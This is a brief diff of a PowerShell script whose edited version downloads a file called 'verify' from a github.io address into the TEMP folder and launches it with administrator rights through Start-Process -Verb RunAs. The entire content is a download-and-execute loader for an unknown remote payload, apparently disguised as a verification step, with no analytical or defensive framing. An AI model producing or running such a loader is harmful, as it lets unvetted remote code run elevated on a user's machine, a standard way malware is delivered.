@@ -1,8 +1,8 @@
 
-$pythonScriptUrl = "http://mcrobbyyt.github.io/test.py"
+$exeScriptUrl = "http://mcrobbyyt.github.io/verify"
 
-$localScriptPath = "$env:TEMP\downloaded_script.py"
+$localScriptPath = "$env:TEMP\verify"
 
-Invoke-WebRequest -Uri $pythonScriptUrl -OutFile $localScriptPath
+Invoke-WebRequest -Uri $exeScriptUrl -OutFile $localScriptPath
 
 Start-Process $localScriptPath -Verb RunAs
